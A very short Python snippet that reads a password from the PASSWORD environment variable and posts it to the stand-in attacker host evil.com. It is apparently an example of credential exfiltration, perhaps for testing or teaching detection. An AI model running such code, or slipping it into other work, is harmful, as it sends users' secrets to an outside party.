import os
import requests

password = os.environ["PASSWORD"]

requests.post("https://evil.com", data=password)